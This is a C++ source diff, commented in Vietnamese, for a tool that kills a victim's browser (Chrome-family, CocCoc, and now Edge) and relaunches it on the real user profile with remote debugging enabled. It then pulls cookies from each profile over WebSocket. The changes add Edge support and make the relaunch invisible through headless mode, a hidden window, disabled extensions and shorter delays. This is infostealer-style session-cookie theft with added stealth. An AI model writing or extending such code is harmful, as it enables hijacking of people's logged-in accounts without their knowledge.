@@ -130,6 +130,19 @@ public:
                     break;
                 }
         }
+        else if (browserName == "edge")
+        {
+            userDataDir = appDataPath + "\\Microsoft\\Edge\\User Data";
+            std::vector<std::string> candidates = {
+                progPath + "\\Microsoft\\Edge\\Application\\msedge.exe",
+                progX86Path + "\\Microsoft\\Edge\\Application\\msedge.exe"};
+            for (const auto &p : candidates)
+                if (FileExists(p))
+                {
+                    exePath = p;
+                    break;
+                }
+        }
         else
             return {{"status", "error"}, {"message", "Unsupported browser type"}};
 
@@ -162,6 +175,8 @@ public:
         std::string exeName = browserName + ".exe";
         if (browserName == "coccoc")
             exeName = "browser.exe";
+        else if (browserName == "edge")
+            exeName = "msedge.exe";
 
         json finalCookies = json::array(); // Mảng chứa tổng cookie
 
@@ -175,14 +190,14 @@ public:
             // A. Kill tiến trình cũ để mở khóa profile
             std::string killCmd = "taskkill /F /IM " + exeName + " >nul 2>&1";
             std::system(killCmd.c_str());
-            Sleep(1500);
+            Sleep(500);
 
-            // B. Khởi động Browser với Profile cụ thể
-            std::string cmd = "\"" + exePath + "\" --remote-debugging-port=9222 --user-data-dir=\"" + userDataDir + "\" --profile-directory=\"" + profile + "\" --no-first-run --password-store=basic --disable-fre --no-default-browser-check --disable-features=RendererCodeIntegrity";
+            // B. Khởi động Browser ở chế độ HEADLESS (hoàn toàn ẩn)
+            std::string cmd = "\"" + exePath + "\" --headless --disable-gpu --remote-debugging-port=9222 --user-data-dir=\"" + userDataDir + "\" --profile-directory=\"" + profile + "\" --no-first-run --password-store=basic --disable-fre --no-default-browser-check --disable-features=RendererCodeIntegrity --disable-extensions";
 
             STARTUPINFOA si = {sizeof(si)};
             si.dwFlags = STARTF_USESHOWWINDOW;
-            si.wShowWindow = SW_SHOWMINIMIZED;
+            si.wShowWindow = SW_HIDE;
 
             PROCESS_INFORMATION pi;
             if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
@@ -190,11 +205,11 @@ public:
                 continue; // Lỗi profile này thì bỏ qua
             }
 
-            // C. Kết nối WebSocket
+            // C. Kết nối WebSocket (Headless mode khởi động nhanh hơn)
             std::string wsUrl = "";
-            for (int i = 0; i < 10; i++)
-            { // Thử 10 lần (10s)
-                Sleep(1000);
+            for (int i = 0; i < 5; i++)
+            { // Thử 5 lần (2.5s max)
+                Sleep(500);
                 std::string jsonList = HttpGet("127.0.0.1", 9222, "/json");
                 if (!jsonList.empty())
                 {
